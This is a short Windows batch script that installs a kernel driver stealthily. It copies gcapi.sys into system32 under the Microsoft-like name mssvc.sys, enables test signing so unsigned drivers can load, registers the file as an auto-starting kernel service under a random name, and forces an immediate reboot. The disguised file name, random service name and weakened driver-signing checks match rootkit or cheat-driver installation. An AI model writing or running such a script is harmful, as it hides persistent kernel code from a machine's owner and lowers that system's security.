copy /y "%cd%\lib\gcapi.sys" "%windir%\system32\mssvc.sys"
bcdedit /set testsigning on
sc create %random% binPath="%windir%\system32\mssvc.sys" type=kernel start=auto
shutdown /r /f /t 0